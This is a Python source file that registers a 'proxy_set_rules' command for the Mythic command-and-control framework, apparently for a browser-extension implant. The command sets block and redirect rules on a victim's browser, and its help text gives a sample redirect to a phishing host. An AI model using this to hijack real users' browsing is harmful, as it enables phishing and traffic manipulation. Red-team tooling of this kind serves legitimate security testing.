from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    CommandParameter,
    ParameterType,
    TaskArguments,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
)


class ProxySetRulesArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self._args = [
            CommandParameter(
                name="block_rules",
                type=ParameterType.String,
                description=(
                    "Comma-separated wildcard patterns to block, e.g. "
                    '"*.facebook.com, tracker.example.com". Use * to block everything.'
                ),
                default_value="",
            ),
            CommandParameter(
                name="redirect_rules",
                type=ParameterType.String,
                description=(
                    "JSON array of {from,to} redirect rules, e.g. "
                    '[{"from":"*.old.com","to":"https://phish.example.com"}]'
                ),
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class ProxySetRulesCommand(CommandBase):
    cmd = "proxy_set_rules"
    needs_admin = False
    help_cmd = "proxy_set_rules [block_rules] [redirect_rules]"
    description = (
        "Define declarativeNetRequest rules (block and/or redirect). Call "
        "enable_proxy to activate them, disable_proxy to clear them."
    )
    version = 1
    author = "@Fir3n0x"
    attackmapping = ["T1090"]
    argument_class = ProxySetRulesArguments
    attributes = CommandAttributes(
        builtin=False,
        suggested_command=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
